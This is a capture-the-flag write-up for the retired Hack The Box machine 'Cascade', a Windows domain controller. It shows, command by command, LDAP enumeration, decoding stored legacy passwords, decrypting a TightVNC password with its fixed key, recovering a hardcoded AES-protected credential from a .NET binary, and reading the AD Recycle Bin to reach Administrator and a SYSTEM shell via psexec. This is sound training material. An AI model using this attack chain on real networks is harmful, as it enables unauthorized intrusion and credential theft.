# Cascade

This is the write-up for the box Cascade that got retired at the 25th July 2020.
My IP address was 10.10.14.8 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.182    cascade.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/cascade.nmap 10.10.10.182
```

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-11 15:12:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

According to the open ports, this box is an **Active Directory Domain Controller**.
Lets put the domain name _cascade.local_ into the _/etc/hosts_ file:
```
10.10.10.182    cascade.htb cascade cascade.local
```

## Checking LDAP (Port 389)

To enumerate LDAP, the naming context is needed first:
```
ldapsearch -x -h 10.10.10.182 -s base namingcontexts
```
```
dn:
namingContexts: DC=cascade,DC=local
(...)
```

Outputting all objects from the domain:
```
ldapsearch -x -h 10.10.10.182 -s sub -b 'DC=cascade,DC=local' > cascade_ldap.output
```

Filtering the output file for unique attributes:
```
cat cascade_ldap.output | awk '{print $1}' | sort | uniq -c | sort -n | grep ':'
```

After analyzing the output, the attribute _cascadeLegacyPwd_ is a non-default attribute name.
Searching for the object that has this attribute name:
```
cat cascade_ldap.output | grep -B40 -A10 cascadeLegacyPwd
```
```
displayName: Ryan Thompson
memberOf: CN=IT,OU=Groups,OU=UK,DC=cascade,DC=local
sAMAccountName: r.thompson
userPrincipalName: r.thompson@cascade.local
(...)
cascadeLegacyPwd: clk0bjVldmE=
```

The user _r.thompson_ owns this attribute and it contains a Base64 string:
```
echo clk0bjVldmE= | base64 -d

rY4n5eva
```

Testing the credentials for the user:
```
crackmapexec smb 10.10.10.182 -u r.thompson -p rY4n5eva
```

## Checking SMB (Port 445)

With the credentials of the user _r.thompson_ it is possible to display the SMB shares:
```
smbmap -H 10.10.10.182 -u r.thompson -p rY4n5eva
```
```
Disk        Permissions     Comment
----        -----------     -------
ADMIN$      NO ACCESS       Remote Admin
Audit$      NO ACCESS
C$          NO ACCESS       Default share
Data        READ ONLY
IPC$        NO ACCESS       Remote IPC
NETLOGON    READ ONLY       Logon server share
print$      READ ONLY       Printer Drivers
SYSVOL      READ ONLY       Logon server share
```

Mounting the _Data share_ to our local client:
```
mkdir /mnt/cascade_data

mount -t cifs -o 'user=r.thompson,password=rY4n5eva' //10.10.10.182/Data /mnt/cascade_data/
```

There are five folders, but the user has only access to the _"IT"_ folder.
The structure in this folder is as follows:
```
- Email Archives
|-- Meeting_Notes_June_2018.html

- LogonAudit (Empty)

- Logs
|-- Ark AD Recycle Bin
  |-- ArkAdRecycleBin.log
|-- DCs
  |-- dcdiag.log

- Temp
|-- r.thompson (Empty)
|-- s.smith
  |-- VNC Install.reg
```

The HTML file _"Meeting_Notes_June_2018.html"_ is about a meeting and in it _Steve Smith_ mentions a temporary admin user:
```
(...)

-- We will be using a temporary account to perform all tasks related to the network migration and this account will be deleted at the end of 2018 once the migration is complete. This will allow us to identify actions related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).

(...)
```

The log file _"ArkAdRecycleBin.log"_ contains information that the users _Test_ and _TempAdmin_ were removed into the **Active Directory Recycle Bin**:
```
Running as user CASCADE\ArkSvc
(...)
Moving object to AD recycle bin CN=Test,OU=Users,OU=UK,DC=cascade,DC=local
Successfully moved object. New location CN=Test\0ADEL:ab073fb7-6d91-4fd1-b877-817b9e1b0e6d,CN=Deleted Objects,DC=cascade,DC=local
(...)
Moving object to AD recycle bin CN=TempAdmin,OU=Users,OU=UK,DC=cascade,DC=local
Successfully moved object. New location CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local
```

The registry file _"VNC Install.reg"_ contains registry information about **TightVNC**:

```
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
(...)
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
(...)
```

It looks like that we need to get to the **Active Directory Recycle Bin** to get information about the _TempAdmin_ user.
To do that, access to the **TightVNC** password seems to be necessary.

### Decrypting TightVNC Password

The registry file contains an encrypted password for **TightVNC** and as the software uses a [fixed key](https://github.com/frizb/PasswordDecrypts), it can be decrypted with the **Metasploit Ruby Shell (IRB)**:
```
msf6 > irb

fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
```
```
sT333ve2
```

As this file was in the folder of _s.smith_, the password probably belongs to that user:
```
crackmapexec winrm 10.10.10.182 -u s.smith -p sT333ve2

WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\s.smith:sT333ve2 (Pwn3d!)
```

The user has enough privileges to authenticate to the **WinRM** service, so lets use [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) to connect there:
```
evil-winrm.rb -i 10.10.10.182 -u s.smith -p sT333ve2
```

## Privilege Escalation

The user _s.smith_ is in an unusual group called _Audit Share_:
```
net users /domain s.smith

(...)
Local Group Memberships
- Audit Share
- IT
- Remote Management Use
```

This group membership grants this user access to the _Audit Share_:
```
smbmap -H 10.10.10.182 -u s.smith -p sT333ve2
```
```
Disk        Permissions     Comment
----        -----------     -------
ADMIN$      NO ACCESS       Remote Admin
Audit$      READ ONLY
(...)
```

Mounting the _Audit share_ to our local client:
```
mkdir /mnt/cascade_audit

mount -t cifs -o 'user=s.smith,password=sT333ve2' //10.10.10.182/Audit$ /mnt/cascade_audit/
```

In there are _.exe_ and _.dll_ files and to analyze these, it is recommended to download the files to our local box.

### Reverse Engineering Windows Binary

The following files are in the share:
- CascAudit.exe
- CascCrypto.dll
- DB/Audit.db
- RunAudit.bat
- System.Data.SQLite.dll
- System.Data.SQLite.EF6.dll
- x64/SQLite.Interop.dll
- x86/SQLite.Interop.dll

The executable file _CascAudit.exe_ is a **.NET Binary**:
```
file CascAudit.exe

PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows

```
Such files can be analyzed and debugged with [dnSpy](https://github.com/dnSpy/dnSpy) on Windows.
The _CascCrypto.dll_ has probably the security functions for this binary.

The function _Crypto_ uses **AES encryption** in **CBC mode** with an initialization vector:
```
(...)
aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842");
aes.Mode = CipherMode.CBC;
(...)
```

This function is used in _CascAudit.exe_ and in the _MainModule_ is a key in line 44:
```
(...)
password = Crypto.DecryptString(encryptedString, "c4scadek3y654321");
(...)
```

After setting a breakpoint on line 44 and running the program with the _Audit.db_ as an argument, it needs one _Step over_ to decrypt the key and display the password in the locals:
```
Name                                            Value
CaseCrypto.Crypto.DecryptString returned        "w3lc0meFr31nd"
```

The password works for the user _ArkSvc_ and it is possible to connect to **WinRM**:
```
crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd

WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\arksvc:w3lc0meFr31nd (Pwn3d!)
```

Connecting to the box with **Evil-WinRM**:
```
evil-winrm.rb -i 10.10.10.182 -u arksvc -p w3lc0meFr31nd
```

### Privilege Escalation to Administrator

The user _arksvc_ is in the group _AD Recycle Bin_ which is what is needed to get information about the _TempAdmin_ account:
```
net users /domain ArkSvc

(...)
Local Group Memberships
- AD Recycle Bin
```

Searching for the deleted objects:
```
Get-ADObject -SearchBase "CN=Deleted Objects,DC=Cascade,DC=Local" -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
```
```
cascadeLegacyPwd                : YmFDVDNyMWFOMDBkbGVz
DisplayName                     : TempAdmin
ObjectGUID                      : f0cc344d-31e0-4866-bceb-a842791ca059
objectSid                       : S-1-5-21-3332504370-1206983947-1165150453-1136
primaryGroupID                  : 513
userPrincipalName               : TempAdmin@cascade.local
```

This user also has the _cascadeLegacyPwd_ attribute with a Base64-encoded string:
```
echo YmFDVDNyMWFOMDBkbGVz | base64 -d

baCT3r1aN00dles
```

As the HTML file from before stated, the password for this user should be the same as for the normal admin account:
```
(...)Username is TempAdmin (password is the same as the normal admin account password).
```

Lets try the _Administrator_ user with this password:
```
crackmapexec winrm 10.10.10.182 -u Administrator -p baCT3r1aN00dles

WINRM       10.10.10.182    5985   CASC-DC1         [+] cascade.local\Administrator:baCT3r1aN00dles (Pwn3d!)
```

The password is the same and it is possible to login into the box with **Impacket-PsExec** to get a shell as _NT Authority\SYSTEM_!
```
impacket-psexec Administrator@10.10.10.182
```
